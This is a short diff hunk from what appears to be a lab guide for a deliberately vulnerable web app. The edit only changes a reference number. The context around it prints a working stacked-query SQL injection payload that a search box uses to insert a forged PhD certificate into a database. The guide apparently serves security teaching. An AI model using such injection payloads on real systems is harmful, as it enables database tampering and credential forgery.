@@ -148,7 +148,7 @@ curl -s -X POST $V/api/register -H 'Content-Type: application/json' \
 ## 6. Cryptography — signatures and encryption
 
 **Signatures (forged diploma):** on `$V`, inject a fake certificate through the
-**Course search** box using the stacked-query SQLi (#9) —
+**Course search** box using a stacked-query SQLi —
 
 ```
 %'; INSERT INTO certifications (student_id,title,grade,issued_date,signature,issued_by) VALUES (4,'PhD in Computer Science','A+','2026-01-01',NULL,1); --
